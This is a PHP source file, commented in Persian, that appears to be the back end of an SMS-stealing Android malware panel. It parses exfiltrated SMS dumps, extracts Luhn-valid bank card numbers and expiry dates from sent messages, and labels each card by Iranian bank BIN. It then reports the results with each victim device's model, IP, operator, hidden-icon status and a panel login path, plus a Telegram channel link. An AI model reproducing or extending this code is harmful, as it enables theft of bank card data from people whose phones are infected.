<?php
/**
 * پردازش فایل پیام‌ها برای استخراج شماره‌های کارت بانکی معتبر از پیام‌های ارسالی
 * نسخه ارتقا یافته با لیست بانک‌های گسترده‌تر و بهینه‌سازی‌های امنیتی
 */

/**
 * تابع اصلی برای پردازش فایل و استخراج شماره‌های کارت
 * @param string $file_path مسیر فایل ورودی
 * @param string $model مدل دستگاه
 * @param string $operator اپراتور شبکه
 * @param string $ip آدرس IP دستگاه
 * @param string $device_id شناسه دستگاه
 * @return string نتیجه پردازش به همراه اطلاعات کاربر
 */
function processCards($file_path, $model, $operator, $ip, $device_id) {
    // اعتبارسنجی ورودی‌ها
    if (empty($file_path) || empty($model) || empty($operator) || empty($ip) || empty($device_id)) {
        return "⚠️ ᴍɪꜱꜱɪɴɢ ʀᴇQᴜɪʀᴇᴅ ᴘᴀʀᴀᴍᴇᴛᴇʀꜱ\n\n" . generateUserInfo($model, $operator, $ip, $device_id);
    }

    // بررسی وجود و خوانایی فایل
    if (!file_exists($file_path) || !is_readable($file_path)) {
        return "⚠️ ᴜꜱᴇʀ ɪꜱ ᴏꜰꜰʟɪɴᴇ ᴏʀ ꜱᴍꜱ ɴᴏᴛ ꜰᴏᴜɴᴅ\n\n" . generateUserInfo($model, $operator, $ip, $device_id);
    }

    // خواندن محتوا با مدیریت خطا
    $content = @file_get_contents($file_path);
    if ($content === false) {
        return "⚠️ ᴜɴᴀʙʟᴇ ᴛᴏ ʀᴇᴀᴅ ꜰɪʟᴇ\n\n" . generateUserInfo($model, $operator, $ip, $device_id);
    }

    // الگو برای یافتن بلوک‌های پیام
    $pattern = '/\|-----@geeeh-----\|(.*?)\|-----@geeeh-----\|/s';
    preg_match_all($pattern, $content, $message_blocks);

    $cards = [];
    foreach ($message_blocks[1] as $block) {
        // بررسی پیام‌های ارسالی
        if (preg_match('/Type\s*:\s*SENT/si', $block)) {
            // استخراج محتوای Text
            if (preg_match('/Text\s*:\s*(.*?)(?=\||$)/si', $block, $text_match)) {
                $text_content = trim($text_match[1]);

                // الگوهای مختلف برای شماره کارت
                $card_patterns = [
                    '/\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b/', // فرمت با فاصله یا خط تیره
                    '/\b\d{16}\b/',                                   // فرمت بدون فاصله
                    '/\b\d{4}\s\d{6}\s\d{5}\b/'                      // فرمت‌های غیرمعمول
                ];

                foreach ($card_patterns as $pattern) {
                    preg_match_all($pattern, $text_content, $card_matches);
                    foreach ($card_matches[0] as $card) {
                        $clean = preg_replace('/[^0-9]/', '', $card);
                        if (strlen($clean) === 16 && ctype_digit($clean) && isValidLuhn($clean)) {
                            $cards[] = $clean;
                        }
                    }
                }
            }
        }
    }

    // بررسی وجود کارت‌ها
    if (empty($cards)) {
        return "⚠️ ɴᴏ ʙᴀɴᴋ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ SENT ᴍᴇꜱꜱᴀɢᴇꜱ\n\n" . generateUserInfo($model, $operator, $ip, $device_id);
    }

    // حذف کارت‌های تکراری
    $cards = array_unique($cards);
    $result = "💳 ᴇxᴛʀᴀᴄᴛᴇᴅ ᴄᴀʀᴅꜱ (ꜰʀᴏᴍ SENT ᴍᴇꜱꜱᴀɢᴇꜱ):\n\n";
    foreach ($cards as $index => $card) {
        $bank_info = getBankInfo(substr($card, 0, 6));
        $result .= ($index + 1) . ". <code>" . formatCardNumber($card) . "</code>\n";
        $result .= "🏦 " . $bank_info['name'] . " (" . $bank_info['tag'] . ")\n";
        $result .= "📅 " . getExpiryInfo($card, $block ?? '') . "\n\n";
    }
    $result .= generateUserInfo($model, $operator, $ip, $device_id);
    return $result;
}

/**
 * تولید اطلاعات کاربر
 * @param string $model مدل دستگاه
 * @param string $operator اپراتور شبکه
 * @param string $ip آدرس IP
 * @param string $device_id شناسه دستگاه
 * @return string اطلاعات کاربر
 */
function generateUserInfo($model, $operator, $ip, $device_id) {
    $status = checkDeviceStatus($device_id);
    $model = htmlspecialchars($model, ENT_QUOTES, 'UTF-8');
    $operator = htmlspecialchars($operator, ENT_QUOTES, 'UTF-8');
    $ip = filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'Invalid IP';
    
    return "📱 ᴍᴏᴅᴇʟ: $model\n"
         . "🧿 ꜱᴛᴀᴛᴜꜱ: " . $status . "\n"
         . "🛜 ᴏᴘᴇʀᴀᴛᴏʀ: $operator\n"
         . "🌐 ɪᴘ: $ip\n"
         . "🗃️ ᴘᴀɴᴇʟ: /login_$device_id\n\n"
         . "🐦‍🔥 | <a href='https://t.me/fyilk_channel1'>ɪᴍ-ꜰʏɪʟᴋ</a>";
}

/**
 * دریافت اطلاعات بانک بر اساس BIN
 * @param string $bin شماره شناسایی بانک (6 رقم اول کارت)
 * @return array اطلاعات بانک شامل نام و تگ
 */
function getBankInfo($bin) {
    $banks = [
        '603799' => ['name' => 'بانک ملی ایران', 'tag' => '#Melli', 'alt_bins' => ['621986']],
        '589210' => ['name' => 'بانک سپه', 'tag' => '#Sepah', 'alt_bins' => ['502908']],
        '627648' => ['name' => 'بانک صادرات ایران', 'tag' => '#Saderat', 'alt_bins' => ['603769']],
        '627961' => ['name' => 'بانک صنعت و معدن', 'tag' => '#SanatMadan', 'alt_bins' => ['627412']],
        '603770' => ['name' => 'بانک کشاورزی', 'tag' => '#Keshavarzi', 'alt_bins' => ['603770']],
        '628023' => ['name' => 'بانک مسکن', 'tag' => '#Maskan', 'alt_bins' => ['628023']],
        '627760' => ['name' => 'پست بانک ایران', 'tag' => '#PostBank', 'alt_bins' => ['627760']],
        '502908' => ['name' => 'بانک توسعه تعاون', 'tag' => '#Taavon', 'alt_bins' => ['502908']],
        '627412' => ['name' => 'بانک اقتصاد نوین', 'tag' => '#EghtesadNovin', 'alt_bins' => ['627412']],
        '622106' => ['name' => 'بانک پارسیان', 'tag' => '#Parsian', 'alt_bins' => ['622106']],
        '502229' => ['name' => 'بانک پاسارگاد', 'tag' => '#Pasargad', 'alt_bins' => ['502229']],
        '639347' => ['name' => 'بانک سینا', 'tag' => '#Sina', 'alt_bins' => ['639347']],
        '636214' => ['name' => 'بانک آینده', 'tag' => '#Ayandeh', 'alt_bins' => ['636214']],
        '505416' => ['name' => 'بانک گردشگری', 'tag' => '#Gardeshgari', 'alt_bins' => ['505416']],
        '606256' => ['name' => 'بانک ملت', 'tag' => '#Mellat', 'alt_bins' => ['610433']],
        '621986' => ['name' => 'بانک سامان', 'tag' => '#Saman', 'alt_bins' => ['621986']],
        '627353' => ['name' => 'بانک تجارت', 'tag' => '#Tejarat', 'alt_bins' => ['585983']],
        '589463' => ['name' => 'بانک رفاه کارگران', 'tag' => '#Refah', 'alt_bins' => ['589463']],
        '505801' => ['name' => 'موسسه اعتباری کوثر', 'tag' => '#Kosar', 'alt_bins' => ['505801']],
        '639599' => ['name' => 'بانک قوامین', 'tag' => '#Ghavamin', 'alt_bins' => ['639599']],
        '636949' => ['name' => 'بانک حکمت ایرانیان', 'tag' => '#Hekmat', 'alt_bins' => ['636949']],
        '627488' => ['name' => 'بانک کارآفرین', 'tag' => '#KarAfarin', 'alt_bins' => ['627488']],
        '636795' => ['name' => 'بانک مرکزی', 'tag' => '#Marfin', 'alt_bins' => ['636795']],
        '628157' => ['name' => 'موسسه اعتباری توسعه', 'tag' => '#EtebariTebHome', 'alt_bins' => ['628157']],
        '502806' => ['name' => 'بانک شهر', 'tag' => '#Shahr', 'alt_bins' => ['502806']],
        '639607' => ['name' => 'بانک سرمایه', 'tag' => '#Sarmayeh', 'alt_bins' => ['639607']],
        '639346' => ['name' => 'بانک انصار', 'tag' => '#Ansar', 'alt_bins' => ['639346']],
        '504706' => ['name' => 'بانک رسالت', 'tag' => '#Resalat', 'alt_bins' => ['504706']],
        '606373' => ['name' => 'بانک قرض‌الحسنه مهر ایران', 'tag' => '#MehrIran', 'alt_bins' => ['606373']],
        '639370' => ['name' => 'موسسه اعتباری نور', 'tag' => '#Noor', 'alt_bins' => ['639370']]
    ];

    // جستجوی BIN
    if (isset($banks[$bin])) {
        return $banks[$bin];
    }

    // جستجوی در پیشوندهای جایگزین
    foreach ($banks as $bank) {
        if (isset($bank['alt_bins']) && in_array($bin, $bank['alt_bins'])) {
            return ['name' => $bank['name'], 'tag' => $bank['tag']];
        }
    }

    return ['name' => 'ناشناخته', 'tag' => '#Unknown'];
}

/**
 * اعتبارسنجی شماره کارت با الگوریتم لوهن
 * @param string $number شماره کارت
 * @return bool نتیجه اعتبارسنجی
 */
function isValidLuhn($number) {
    $sum = 0;
    $numDigits = strlen($number);
    $parity = $numDigits % 2;

    for ($i = 0; $i < $numDigits; $i++) {
        $digit = (int)$number[$i];
        if ($i % 2 === $parity) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }

    return ($sum % 10) === 0;
}

/**
 * فرمت کردن شماره کارت برای نمایش
 * @param string $card شماره کارت
 * @return string شماره کارت فرمت شده
 */
function formatCardNumber($card) {
    if (strlen($card) !== 16) {
        return $card;
    }
    return substr($card, 0, 4) . ' ' . substr($card, 4, 4) . ' ' .
           substr($card, 8, 4) . ' ' . substr($card, 12, 4);
}

/**
 * استخراج اطلاعات تاریخ انقضا
 * @param string $card شماره کارت
 * @param string $message پیام مرتبط (اختیاری)
 * @return string اطلاعات تاریخ انقضا
 */
function getExpiryInfo($card, $message = '') {
    // الگو برای استخراج تاریخ انقضا (مثال: 12/25 یا 1225)
    $expiry_pattern = '/(\d{2})[\/-](\d{2,4})/';
    if (preg_match($expiry_pattern, $message, $expiry_match)) {
        $month = $expiry_match[1];
        $year = strlen($expiry_match[2]) === 2 ? '20' . $expiry_match[2] : $expiry_match[2];
        return "Expiry: $month/$year";
    }
    return "Expiry: N/A";
}

/**
 * بررسی وضعیت دستگاه
 * @param string $device_id شناسه دستگاه
 * @return string وضعیت دستگاه
 */
function checkDeviceStatus($device_id) {
    // شبیه‌سازی بررسی وضعیت (قابل جایگزینی با API واقعی)
    return "ɪᴄᴏɴ: Hidden - ꜱᴄʀᴇᴇɴ: ON";
}

/**
 * پردازش ایمن با مدیریت خطاها
 * @param string $file_path مسیر فایل
 * @param string $model مدل دستگاه
 * @param string $operator اپراتور
 * @param string $ip آدرس IP
 * @param string $device_id شناسه دستگاه
 * @return string نتیجه پردازش
 */
function secureProcessCards($file_path, $model, $operator, $ip, $device_id) {
    try {
        // محدود کردن اندازه فایل برای جلوگیری از بارگذاری بیش از حد
        if (filesize($file_path) > 10485760) { // 10MB
            throw new Exception("File size exceeds limit");
        }
        return processCards($file_path, $model, $operator, $ip, $device_id);
    } catch (Exception $e) {
        error_log("Error processing cards: " . $e->getMessage());
        return "⚠️ ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ ᴡʜɪʟᴇ ᴘʀᴏᴄᴇꜱꜱɪɴɢ ᴄᴀʀᴅꜱ\n\n" . 
               generateUserInfo($model, $operator, $ip, $device_id);
    }
}